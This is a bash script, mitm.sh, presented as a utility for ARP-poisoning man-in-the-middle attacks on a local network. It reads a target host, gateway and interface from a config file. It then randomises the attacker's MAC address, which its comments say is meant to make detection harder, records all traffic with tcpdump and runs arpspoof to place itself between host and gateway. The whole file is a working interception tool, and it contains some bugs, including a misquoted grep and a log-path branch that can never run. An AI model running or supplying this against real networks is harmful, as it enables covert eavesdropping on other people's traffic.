#!/bin/bash


HELP="
	DESCRIPTION	-	mitm.sh is an bash utilitary for ARP poisoning type of attacks, in wich the user will trick a LAN host and
				the LAN gateway into thinking that it is another host/gateway.

	USAGE		-	mitm.sh -r,
				
				in the mitm.conf file coitaned in the same directory as mitm.sh the user will set necessary parameters for
				the attack.

	AUTHOR		-	Daniel Gomes, gomesvenzi@gmail.com

	CÓPIA NÃO COMÉDIA

"

ERR="
	Wrong usage of command, use option -h or --help for more information.
"


if [ -z $1 ] ; then

	echo "$ERR"
	

elif [ $1 == "-h" ] || [ $1 == "--help" ] ; then

	echo "$HELP"

elif [ $1 == "-r" ] ; then

	
	#Getting the configured parameters from the mitm.conf file and checking if they were configured correctly

	I_FILE=$(cat ./mitm.conf | grep "^INTERFACE")

	if [ $? != "0" ] ; then
		echo "$ERR" ; exit
	fi

	I_SIZE=$(cat ./mitm.conf | grep "^INTERFACE" | wc -c)

	if [ $I_SIZE == "11" ] ; then
		echo "$ERR" ; exit
	fi

	G_FILE=$(cat ./mitm.conf | grep "^GW")

	if [ $? != "0" ] ; then
		echo "$ERR" ; exit
	fi

	G_SIZE=$(cat ./mitm.conf | grep "^GW" | wc -c)

	if [ $G_SIZE == "4" ] ; then
		echo "$ERR" ; exit
	fi

	H_FILE=$(cat ./mitm.conf | grep "^HOST")

	if [ $? != "0" ] ; then
		echo "$ERR" ; exit
	fi

	H_SIZE=$(cat ./mitm.conf | grep "^HOST" | wc -c )

	if [ $H_SIZE == "6" ] ; then
		echo "$ERR" ; exit
	fi

	FH_FILE=$(cat ./mitm.conf | grep "^FOOLED_HOST")

	if [ $? != "0" ] ; then
		echo "$ERR" ; exit
	fi

	FH_SIZE=$(cat ./mitm.conf | grep "^FOOLED_HOST | wc -c")

	if [ $FH_SIZE == "12" ] ; then
		echo "$ERR" ; exit
	fi

	L_FILE=$(cat ./mitm.conf | grep "^LOG_FILE")

	if [ $? != "0" ] ; then
		DEF="1"
	elif [ $? == "0" ] ; then
		DEF="0"
	fi

	

	#awk -F"${char}" '{print NF-1}' <<< "${string}"

	#Getting the value from the parameters in mitm.conf file
	
	DELIMITER=":"
	INTERFACE=$(echo "$I_FILE" | cut -d':' -f2)
	GW=$(echo "$G_FILE" | cut -d':' -f2)
	HOST=$(echo $H_FILE | cut -d':' -f2)
	FOOLED_HOST=$(echo "$FH_FILE" | cut -d':' -f2)

	if [ $DEF -eq 1 ] ; then
		LOG="./log/log_arp.pcap"
	elif [ $DEF -eq 1 ] ; then
		LOG=$(echo "$L_FILE" | cut -d':' -f2)
	fi

	echo "$LOG"
		
	#Changing the giver interface MAC address in order to make detection mor difficult. 
	sudo ifconfig $INTERFACE down ; sudo macchanger -r $INTERFACE &> /dev/null; sudo ifconfig $INTERFACE up

	# Begin to listen the traffic thats comming from the interface
	tcpdump -w ./log/log_momo.pcap -i $INTERFACE &> /dev/null &


	#Sending out the first forged ARP replies.
	#Fooling a LAN host into thinking you are the gateway, and fooling the LAN gateway into thinking you are the host

	#bash ./keep_arp.sh $INTERFACE $GW $FOOLED_HOST &> /dev/null

	arpspoof -i $INTERFACE -t $GW -r $FOOLED_HOST 


		
fi
